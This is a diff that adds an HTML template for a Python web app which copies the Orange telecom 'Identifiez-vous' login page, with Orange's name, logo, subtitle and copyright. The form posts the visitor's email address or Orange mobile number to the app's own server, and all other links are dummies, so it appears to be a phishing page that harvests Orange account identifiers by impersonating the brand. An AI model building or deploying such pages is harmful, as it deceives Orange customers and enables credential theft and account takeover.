@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Identifiez-vous | Orange</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="wrapper">
+        <div class="login-box">
+            <div class="top-bar"></div>
+            <img src="{{ url_for('static', filename='images/logo-orange.png') }}" alt="Orange Logo" class="logo">
+            <h1>Identifiez-vous</h1>
+            <h2 class="h4 mb-0" data-testid="pageSubtitle">Indiquez votre compte Orange</h2>            <form method="POST">
+                <input type="text" name="email" placeholder="Adresse e-mail ou n° de mobile Orange" required>
+                <button type="submit">Continuer</button>
+            </form>
+            <div class="forgot-id">
+                <a href="#">Identifiant oublié ?</a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Informations légales</a>
+            <a href="#">Données personnelles</a>
+            <a href="#">Accessibilité</a>
+            <a href="#">Tarifs et Contrats</a>
+            <a href="#">Politique des cookies</a>
+        </div>
+        <p>© Orange 2025</p>
+    </footer>
+</body>
+</html>
